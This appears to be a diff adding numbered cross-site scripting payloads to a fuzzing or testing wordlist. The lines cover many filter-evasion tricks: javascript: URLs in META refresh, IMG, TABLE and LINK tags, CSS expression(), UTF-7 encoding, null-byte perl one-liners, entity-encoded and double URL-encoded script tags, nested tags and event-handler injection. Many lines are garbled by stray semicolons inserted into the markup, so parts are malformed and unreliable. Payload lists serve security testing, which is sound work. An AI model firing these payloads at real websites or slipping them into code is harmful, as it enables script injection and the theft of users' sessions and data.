+<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(1892);";>;
+<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(1893);";>;
+<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(1894)>;<;/OBJECT>;
+a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(1895);";)";;&#10;eval(a+b+c+d);
+<;STYLE TYPE=";text/javascript";>;alert(1896);<;/STYLE>;
+<;IMG STYLE=";xss:expr/*XSS*/ession(alert(1897))";>;
+<;XSS STYLE=";xss:expression(alert(1898))";>;
+<;STYLE>;.XSS{background-image:url(";javascript:alert(1899)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
+<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(1900)";)}<;/STYLE>;
+<;LINK REL=";stylesheet"; HREF=";javascript:alert(1901);";>;
+<;TABLE BACKGROUND=";javascript:alert(1902)";>;<;/TABLE>;
+<;TABLE>;<;TD BACKGROUND=";javascript:alert(1903)";>;<;/TD>;<;/TABLE>;
+<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(1904);";>;]]>;
+<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(1905)";>;<;/B>;<;/I>;<;/XML>;
+<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(1906)<;/SCRIPT>;";>;
+<;BR SIZE=";&;{alert(1907)}";>;
+<;IMG SRC=JaVaScRiPt:alert(1908)>;
+<;IMG SRC=javascript:alert(1909)>;
+<;IMG SRC=`javascript:alert(1910)`>;
+<;IMG SRC=javascript:alert(1911))>;
+<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(1912);+ADw-/SCRIPT+AD4-
+\";;alert(1913);//
+<;/TITLE>;<;SCRIPT>;alert(1914);<;/SCRIPT>;
+<;STYLE>;@im\port';\ja\vasc\ript:alert(1915)';;<;/STYLE>;
+<;IMG SRC=";jav&#x09;ascript:alert(1916);";>;
+<;IMG SRC=";jav&;#x09;ascript:alert(1917);";>;
+<;IMG SRC=";jav&;#x0A;ascript:alert(1918);";>;
+<;IMG SRC=";jav&;#x0D;ascript:alert(1919);";>;
+perl -e ';print ";<;IM SRC=java\0script:alert(1920)>";;';>; out
+perl -e ';print ";&;<;SCR\0IPT>;alert(1921)<;/SCR\0IPT>;";;'; >; out
+<;IMG SRC="; &;#14;  javascript:alert(1922);";>;
+<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(1923)>;
+<;IMG SRC=";javascript:alert(1924)";
+<;<;SCRIPT>;alert(1925);//<;<;/SCRIPT>;
+<;IMG ";";";>;<;SCRIPT>;alert(1926)<;/SCRIPT>;";>;
+";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(1927)>;
+<;/script>;<;script>;alert(1928)<;/script>;
+<;scrscriptipt>;alert(1930)<;/scrscriptipt>;
+<;br size=\";&;{alert(1931)}\";>;
+perl -e &#039;print \";<;IMG SRC=java\0script:alert(1932)>;\";;&#039; >; out
+perl -e &#039;print \";<;SCR\0IPT>;alert(1933)<;/SCR\0IPT>;\";;&#039; >; out
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(1934))>
+<~/XSS/*-*/STYLE=xss:e/**/xpression(alert(1935))>
+<~/XSS STYLE=xss:expression(alert(1936))>
+"><script>alert(1937)</script>
+</XSS/*-*/STYLE=xss:e/**/xpression(alert(1938))>
+XSS/*-*/STYLE=xss:e/**/xpression(alert(1939))>
+XSS STYLE=xss:e/**/xpression(alert(1940))>
+</XSS STYLE=xss:expression(alert(1941))>
+>"><script>alert(1942)</script>&
+"><STYLE>@import"javascript:alert(1943)";</STYLE>
+>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(1944)>
+>%22%27><img%20src%3d%22javascript:alert(1945)%22>
+'%uff1cscript%uff1ealert(1946)%uff1c/script%uff1e'
+<IMG SRC="javascript:alert(1947);">
+<IMG SRC=javascript:alert(1948)>
+<IMG SRC=JaVaScRiPt:alert(1949)>
+<IMG SRC=JaVaScRiPt:alert(1950)>
+<IMG SRC="jav&#x0A;ascript:alert(1951);">
+<IMG SRC="jav&#x0D;ascript:alert(1952);">
+<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert(1953);<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
+<script>alert(1954)</script>
+%3cscript%3ealert(1955)%3c/script%3e
+%22%3e%3cscript%3ealert(1956)%3c/script%3e
+<IMG SRC="javascript:alert(1957);">
+<IMG SRC=javascript:alert(1958)>
+<IMG SRC=javascript:alert(1959)>
+<img src=xss onerror=alert(1960)>
+<IMG """><SCRIPT>alert(1961)</SCRIPT>">
+<IMG SRC=javascript:alert(1962))>
+<IMG SRC="jav ascript:alert(1963);">
+<IMG SRC="jav&#x09;ascript:alert(1964);">
+<BODY BACKGROUND="javascript:alert(1965)">
+<BODY ONLOAD=alert(1966)>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1967);">
+<IMG SRC="javascript:alert(1968)"
+<<SCRIPT>alert(1969);//<</SCRIPT>
+%253cscript%253ealert(1970)%253c/script%253e
+"><s"%2b"cript>alert(1971)</script>
+foo<script>alert(1972)</script>
+<scr<script>ipt>alert(1973)</scr</script>ipt>
+';alert(1974))//\';alert(1974))//";alert(1974))//\";alert(1974))//--></SCRIPT>">'><SCRIPT>alert(1974))</SCRIPT>
+<marquee onstart='javascript:alert(1975);'>=(◕_◕)=
+</span></span><svg onload="alert(1976)//“ #"="">
